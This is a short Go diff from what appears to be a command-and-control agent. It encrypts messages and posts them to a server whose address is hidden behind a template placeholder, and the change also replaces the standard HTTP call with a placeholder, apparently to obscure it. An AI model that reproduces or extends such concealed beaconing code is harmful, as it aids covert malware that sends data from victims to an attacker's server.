@@ -96,7 +96,7 @@ func sendMsg(msgType string, data []byte) []byte {
 	encMsg := crypto.Encrypt(data, aesKey)
 	final := append(encPub, encMsg...)
 	fullMessage = final
-	r, err := http.Post(("https://" + {{HIDDEN_HOST}} + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
+	r, err := {{HIDDEN_HTTP_POST_CALL}}.Post(("https://" + {{HIDDEN_HOST}} + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
 	}
